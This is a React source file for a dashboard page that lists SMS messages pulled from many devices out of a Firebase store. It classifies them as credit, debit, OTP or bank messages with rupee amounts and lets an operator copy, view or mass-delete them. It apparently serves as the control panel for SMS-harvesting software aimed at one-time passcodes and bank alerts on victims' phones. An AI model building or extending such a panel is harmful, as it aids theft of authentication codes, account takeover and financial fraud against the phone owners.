import { useState, useMemo, useRef } from "react";
import { useAllDevicesSMS, useFirebaseUsers, SMS } from "@/hooks/useFirebaseData";
import { useSecuritySettings } from "@/hooks/useSecuritySettings";
import { ref, remove } from "@/lib/rtdbPb";
import { db } from "@/lib/firebase";
import { Search, Loader2, MessageSquare, ArrowLeft, ArrowRight, ArrowDownLeft, ArrowUpRight, Key, Building2, ArrowUp, Copy, Trash2, Eye, Trash, ArrowUpDown } from "lucide-react";
import { Skeleton } from "@/components/ui/skeleton";
import { format } from "date-fns";
import { toast } from "sonner";
import DeviceDetail from "@/components/DeviceDetail";
import OtpDialog from "@/components/OtpDialog";
import { classifySMS as classifyMessage } from "@/lib/smsParser";

const PAGE_SIZE = 20;

const typeBadge: Record<string, { label: string; bg: string; text: string; icon: React.ElementType }> = {
  credit: { label: "Credit", bg: "bg-green/10", text: "text-green", icon: ArrowDownLeft },
  debit: { label: "Debit", bg: "bg-destructive/10", text: "text-destructive", icon: ArrowUpRight },
  otp: { label: "OTP", bg: "bg-yellow/10", text: "text-yellow", icon: Key },
  bank: { label: "Bank", bg: "bg-cyan/10", text: "text-cyan", icon: Building2 },
  promo: { label: "Promo", bg: "bg-secondary", text: "text-muted-foreground", icon: MessageSquare },
  other: { label: "Other", bg: "bg-secondary", text: "text-muted-foreground", icon: MessageSquare },
};

const MessagesPage = () => {
  const { allSms, loading, loadingMore, hasMore, loadMore } = useAllDevicesSMS();
  const { users } = useFirebaseUsers();
  const { security } = useSecuritySettings();
  const [search, setSearch] = useState("");
  const [page, setPage] = useState(1);
  const [filterType, setFilterType] = useState<string>("all");
  const [sortOrder, setSortOrder] = useState<"newest" | "oldest">("newest");
  const [viewDevice, setViewDevice] = useState<{ id: string; highlightKey?: string } | null>(null);
  const topRef = useRef<HTMLDivElement>(null);
  const [otpAction, setOtpAction] = useState<{ action: string; callback: () => void } | null>(null);
  const [deletingAll, setDeletingAll] = useState(false);

  const classified = useMemo(() => allSms.map((sms) => ({ ...sms, classification: classifyMessage(sms.body, sms.sender) })), [allSms]);

  const filtered = useMemo(() => {
    let result = classified;
    if (filterType !== "all") result = result.filter((s) => s.classification.type === filterType);
    if (search.trim()) {
      const q = search.toLowerCase();
      result = result.filter((s) => s.body.toLowerCase().includes(q) || s.sender.toLowerCase().includes(q) || s.deviceId?.toLowerCase().includes(q));
    }
    return [...result].sort((a, b) => sortOrder === "newest" ? b.date - a.date : a.date - b.date);
  }, [classified, search, filterType, sortOrder]);

  const totalPages = Math.max(1, Math.ceil(filtered.length / PAGE_SIZE));
  const paginated = filtered.slice((page - 1) * PAGE_SIZE, page * PAGE_SIZE);

  const scrollToTop = () => topRef.current?.scrollIntoView({ behavior: "smooth" });

  const handleCopy = (body: string) => {
    navigator.clipboard.writeText(body);
    toast.success("Copied");
  };

  const doDelete = async (sms: SMS & { classification: any }) => {
    try {
      const deviceId = sms.deviceId;
      const smsKey = sms.key.replace(`${deviceId}_`, "");
      await remove(ref(db, `mess/${deviceId}/smss/${smsKey}`));
      toast.success("Deleted");
    } catch {
      toast.error("Failed to delete");
    }
  };

  const handleDelete = (sms: SMS & { classification: any }) => {
    if (security.otp_on_delete) {
      setOtpAction({ action: "Delete SMS", callback: () => doDelete(sms) });
    } else {
      doDelete(sms);
    }
  };

  const doDeleteAll = async () => {
    setDeletingAll(true);
    try {
      await remove(ref(db, "mess"));
      toast.success("All SMS deleted");
    } catch {
      toast.error("Failed to delete all SMS");
    }
    setDeletingAll(false);
  };

  const handleDeleteAll = () => {
    if (security.otp_on_delete) {
      setOtpAction({ action: "Delete All SMS", callback: doDeleteAll });
    } else {
      if (confirm("Are you sure you want to delete ALL SMS from all devices?")) {
        doDeleteAll();
      }
    }
  };

  return (
    <div className="min-h-screen bg-background pb-20 lg:pb-6">
      <div ref={topRef} />
      <header className="sticky top-0 z-30 border-b border-border bg-background/80 backdrop-blur-xl">
        <div className="px-5 lg:px-8 pt-5 pb-3 space-y-3 max-w-6xl mx-auto">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-3">
              <div className="h-10 w-10 rounded-2xl bg-primary/15 flex items-center justify-center">
                <MessageSquare className="h-5 w-5 text-primary" />
              </div>
              <div>
                <h1 className="text-lg font-extrabold text-foreground tracking-tight">Messages</h1>
                <p className="text-[10px] text-muted-foreground font-medium">
                  {loading ? "Loading..." : `${filtered.length} messages across all devices`}
                </p>
              </div>
            </div>
            <button
              onClick={handleDeleteAll}
              disabled={deletingAll || allSms.length === 0}
              className="flex items-center gap-1.5 px-3 py-2 rounded-xl bg-destructive/10 text-destructive text-[10px] font-bold hover:bg-destructive/20 transition-colors disabled:opacity-40"
            >
              {deletingAll ? <Loader2 className="h-3 w-3 animate-spin" /> : <Trash className="h-3 w-3" />}
              Delete All
            </button>
          </div>
          <div className="relative">
            <Search className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-muted-foreground" />
            <input
              type="text"
              value={search}
              onChange={(e) => { setSearch(e.target.value); setPage(1); }}
              placeholder="Search messages, sender, device..."
              className="w-full rounded-xl border border-border bg-secondary/50 pl-10 pr-4 py-2.5 text-sm text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-1 focus:ring-primary/40"
            />
          </div>
          <div className="flex flex-wrap gap-1.5">
            {["all", "credit", "debit", "otp", "bank", "other"].map((t) => (
              <button
                key={t}
                onClick={() => { setFilterType(t); setPage(1); }}
                className={`px-2.5 py-1 rounded-xl text-[11px] font-bold border transition-all ${
                  filterType === t
                    ? "bg-primary text-primary-foreground border-primary shadow-[0_0_10px_hsl(var(--primary)/0.2)]"
                    : "bg-card text-muted-foreground border-border hover:text-foreground hover:border-primary/30"
                }`}
              >
                {t === "all" ? "All" : t.charAt(0).toUpperCase() + t.slice(1)}
              </button>
            ))}
            <button
              onClick={() => setSortOrder(s => s === "newest" ? "oldest" : "newest")}
              className="flex items-center gap-1 px-2.5 py-1 rounded-xl text-[11px] font-bold border bg-card text-muted-foreground border-border hover:text-foreground hover:border-primary/30 transition-all"
            >
              <ArrowUpDown className="h-3 w-3" />
              {sortOrder === "newest" ? "Newest" : "Oldest"}
            </button>
          </div>
        </div>
      </header>

      <div className="px-5 lg:px-8 py-4 space-y-3 max-w-6xl mx-auto">

        {loading ? (
          <div className="space-y-2">
            {Array.from({ length: 6 }).map((_, i) => (
              <div key={i} className="rounded-xl border border-border bg-card/50 p-3 space-y-2">
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-2">
                    <Skeleton className="h-4 w-20" />
                    <Skeleton className="h-5 w-14 rounded-full" />
                  </div>
                  <Skeleton className="h-3 w-16" />
                </div>
                <Skeleton className="h-3 w-full" />
                <Skeleton className="h-3 w-3/4" />
                <div className="flex items-center justify-between">
                  <div className="flex gap-2">
                    <Skeleton className="h-4 w-10 rounded" />
                    <Skeleton className="h-4 w-20" />
                  </div>
                  <div className="flex gap-1">
                    <Skeleton className="h-6 w-6 rounded-md" />
                    <Skeleton className="h-6 w-6 rounded-md" />
                  </div>
                </div>
              </div>
            ))}
          </div>
        ) : paginated.length === 0 ? (
          <div className="flex flex-col items-center justify-center py-16 gap-2">
            <MessageSquare className="h-8 w-8 text-muted-foreground" />
            <p className="text-sm text-muted-foreground">No messages found</p>
          </div>
        ) : (
           <div className="grid grid-cols-1 md:grid-cols-2 xl:grid-cols-3 gap-2 lg:gap-3">
            {paginated.map((sms) => {
              const badge = typeBadge[sms.classification.type];
              const BadgeIcon = badge.icon;
              return (
                <div key={sms.key} onClick={() => sms.deviceId && users[sms.deviceId] && setViewDevice({ id: sms.deviceId, highlightKey: sms.key.replace(`${sms.deviceId}_`, "") })} className="rounded-xl border border-border bg-card/50 p-3 transition-all hover:border-primary/30 cursor-pointer">
                  <div className="flex items-start justify-between mb-1.5">
                    <div className="flex items-center gap-2">
                      <span className="text-xs font-semibold text-cyan font-mono">{sms.sender}</span>
                      <span className={`inline-flex items-center gap-1 text-[10px] px-1.5 py-0.5 rounded-full ${badge.bg} ${badge.text}`}>
                        <BadgeIcon className="h-2.5 w-2.5" />
                        {badge.label}
                        {sms.classification.amount && <span className="font-mono font-bold ml-0.5">₹{sms.classification.amount}</span>}
                      </span>
                    </div>
                    <span className="text-[10px] text-muted-foreground">
                      {format(new Date(sms.date), "MMM dd, HH:mm")}
                    </span>
                  </div>
                  <p className="text-xs text-foreground/90 leading-relaxed mb-1.5">{sms.body}</p>
                  <div className="flex items-center justify-between">
                    <div className="flex items-center gap-2 text-[10px] text-muted-foreground">
                      <span className="px-1.5 py-0.5 rounded bg-secondary">{sms.sim}</span>
                      <span className="font-mono">{sms.deviceId}</span>
                    </div>
                    <div className="flex items-center gap-1">
                      <button
                        onClick={(e) => { e.stopPropagation(); handleCopy(sms.body); }}
                        className="p-1 rounded-md bg-secondary text-muted-foreground hover:text-foreground transition-colors"
                      >
                        <Copy className="h-3 w-3" />
                      </button>
                      <button
                        onClick={(e) => { e.stopPropagation(); handleDelete(sms); }}
                        className="p-1 rounded-md bg-destructive/10 text-destructive hover:bg-destructive/20 transition-colors"
                      >
                        <Trash2 className="h-3 w-3" />
                      </button>
                       {sms.deviceId && users[sms.deviceId] && (
                        <button
                          onClick={(e) => { e.stopPropagation(); setViewDevice({ id: sms.deviceId!, highlightKey: sms.key.replace(`${sms.deviceId}_`, "") }); }}
                          className="p-1 rounded-md bg-primary/10 text-primary hover:bg-primary/20 transition-colors"
                        >
                          <Eye className="h-3 w-3" />
                        </button>
                      )}
                    </div>
                  </div>
                </div>
              );
            })}
          </div>
        )}

        {/* Load More */}
        {hasMore && !loading && (
          <div className="flex justify-center py-4">
            <button
              onClick={loadMore}
              disabled={loadingMore}
              className="flex items-center gap-2 px-5 py-2.5 rounded-xl bg-primary/10 text-primary text-sm font-semibold hover:bg-primary/20 transition-colors disabled:opacity-50"
            >
              {loadingMore ? (
                <>
                  <Loader2 className="h-4 w-4 animate-spin" />
                  Loading more...
                </>
              ) : (
                <>Load More Messages</>
              )}
            </button>
          </div>
        )}

        {totalPages > 1 && (
          <div className="flex items-center justify-center gap-3 py-4">
            <button
              onClick={() => { setPage((p) => Math.max(1, p - 1)); scrollToTop(); }}
              disabled={page === 1}
              className="p-2 rounded-lg bg-secondary text-foreground disabled:opacity-30 hover:bg-primary/20 transition-colors"
            >
              <ArrowLeft className="h-4 w-4" />
            </button>
            <span className="text-xs text-muted-foreground">Page {page} of {totalPages}</span>
            <button
              onClick={() => { setPage((p) => Math.min(totalPages, p + 1)); scrollToTop(); }}
              disabled={page === totalPages}
              className="p-2 rounded-lg bg-secondary text-foreground disabled:opacity-30 hover:bg-primary/20 transition-colors"
            >
              <ArrowRight className="h-4 w-4" />
            </button>
          </div>
        )}
      </div>

      <button
        onClick={scrollToTop}
        className="fixed bottom-20 right-4 z-40 h-10 w-10 rounded-full gradient-purple-pink flex items-center justify-center shadow-lg hover:scale-105 transition-transform"
      >
        <ArrowUp className="h-5 w-5 text-foreground" />
      </button>

      {viewDevice && users[viewDevice.id] && (
        <DeviceDetail id={viewDevice.id} user={users[viewDevice.id]} onClose={() => setViewDevice(null)} highlightSmsKey={viewDevice.highlightKey} />
      )}

      {otpAction && (
        <OtpDialog
          action={otpAction.action}
          onVerified={() => { otpAction.callback(); setOtpAction(null); }}
          onCancel={() => setOtpAction(null)}
        />
      )}
    </div>
  );
};

export default MessagesPage;
